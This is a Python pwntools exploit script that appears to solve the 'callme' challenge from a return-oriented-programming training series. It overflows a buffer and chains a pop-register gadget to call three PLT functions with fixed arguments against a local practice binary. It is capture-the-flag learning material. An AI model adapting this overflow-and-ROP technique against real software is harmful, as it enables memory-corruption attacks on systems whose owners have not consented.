#!/usr/bin/env python
from pwn import *

s = process('callme')
s.recvuntil('>')

padding = 40

elf = ELF('callme')

callme_one_plt = elf.plt['callme_one']
callme_two_plt = elf.plt['callme_two']
callme_three_plt = elf.plt['callme_three']

print 'callme_one_plt', hex(callme_one_plt)
print 'callme_two_plt', hex(callme_two_plt)
print 'callme_three_plt', hex(callme_three_plt)

#0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
pop_rdi_rsi_rdx_ret = 0x401ab0

payload = 'A' * padding
payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_one_plt)

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_two_plt)

payload += p64(pop_rdi_rsi_rdx_ret)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(callme_three_plt)

s.sendline(payload)
s.interactive()

